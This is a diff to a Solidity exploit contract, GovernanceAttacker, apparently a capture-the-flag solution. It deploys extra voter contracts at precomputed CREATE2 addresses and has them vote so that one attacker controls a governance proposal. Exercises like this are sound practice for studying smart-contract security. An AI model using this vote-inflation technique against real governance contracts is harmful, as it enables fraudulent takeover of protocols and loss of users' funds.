@@ -142,7 +142,7 @@ contract GovernanceAttacker {
         AttackerViceroy viceroy = deployViceroyAttack(governance, proposal, preCalcedVotersA);
 
         // deploy voter
-        deployVoters(5);
+        deployVoters(0, 5);
 
         // vote
         for (uint i; i < preCalcedVotersA.length; i++) {
@@ -156,6 +156,16 @@ contract GovernanceAttacker {
 
         // approve new voters
         viceroy.approveNewVoters(preCalcedVotersB);
+
+        // deploy new voter
+        deployVoters(5, 10);
+
+        // vote with new voters
+        for (uint i; i < preCalcedVotersB.length; i++) {
+            AttackerVoter(preCalcedVotersB[i]).vote(governance, proposalId, address(viceroy));
+        }
+        // (votes, ) = governance.proposals(proposalId);
+        // assert(votes == 10);
     }
 
     function deployViceroyAttack(
@@ -180,8 +190,8 @@ contract GovernanceAttacker {
         return getCreate2Address(viceroyCreationCode, nonce);
     }
 
-    function deployVoters(uint num) internal {
-        for (uint i; i < num; i++) {
+    function deployVoters(uint startIndex, uint endIndex) internal {
+        for (uint i = startIndex; i < endIndex; i++) {
             new AttackerVoter{salt: bytes32(i)}();
         }
     }
